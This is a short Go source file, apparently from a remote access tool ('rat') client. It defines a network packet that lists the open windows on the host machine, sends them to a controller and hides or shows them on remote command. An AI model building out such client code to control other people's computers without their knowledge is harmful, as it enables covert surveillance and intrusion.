package main

import (
	"rat/client/windows"
	"rat/shared"
	"rat/shared/network/header"
)

type WindowsPacket struct {
	Windows []shared.Window `network:"send,receive"`
	Action  int             `network:"receive"`
}

func (packet WindowsPacket) Header() header.PacketHeader {
	return header.WindowsHeader
}

func (packet *WindowsPacket) Init() {
	windows.QueryWindows()

	packet.Windows = windows.Windows
}

func (packet WindowsPacket) OnReceive() error {
	switch packet.Action {
	case shared.Reload:
		Queue <- &WindowsPacket{}
	case shared.Minimize:
		fallthrough
	case shared.Show:
		visible := packet.Action == shared.Show

		for _, window := range packet.Windows {
			windows.SetDisplayState(window.Handle, visible)
		}
	}

	return nil
}
